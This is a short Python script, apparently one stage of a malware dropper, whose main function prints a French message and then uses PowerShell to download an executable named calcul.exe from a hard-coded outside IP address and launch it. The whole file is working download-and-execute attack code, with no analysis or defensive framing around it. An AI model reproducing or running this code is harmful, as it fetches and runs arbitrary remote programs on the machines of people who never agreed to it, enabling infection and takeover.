import os
import Dropper

def main():
    print(u"Ici va télécharger l'exe")
    try:
        os.system(f"powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('http://54.90.113.98:8000/calcul.exe', '{Dropper.save_path}\\calcul.exe')")
        os.popen(f"powershell.exe -Command Invoke-Item {Dropper.save_path}\\calcul.exe")
        return True
    except:
        return False

#main()
